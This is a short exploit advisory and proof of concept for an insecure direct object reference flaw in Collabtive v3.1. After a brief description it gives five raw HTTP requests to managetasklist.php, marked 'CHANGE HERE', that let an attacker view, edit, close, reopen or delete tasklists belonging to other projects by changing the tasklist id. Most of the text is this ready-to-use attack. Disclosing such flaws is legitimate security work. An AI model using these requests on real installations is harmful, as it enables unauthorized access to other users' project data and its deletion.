# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/update/close/open/delete the tasklist that belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managetasklist.php?action=showtasklist&id=1&tlid=3(CHANGE HERE) HTTP/1.1
```

```
POST /managetasklist.php?action=edit&id=1&tlid=3(CHANGE HERE) HTTP/1.1
...

name=ms11&desc=&milestone=0
```

```
GET /managetasklist.php?action=close&tlid=6(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managetasklist.php?action=open&tlid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
GET /managetasklist.php?action=del&tlid=1(CHANGE HERE)&id=1 HTTP/1.1
```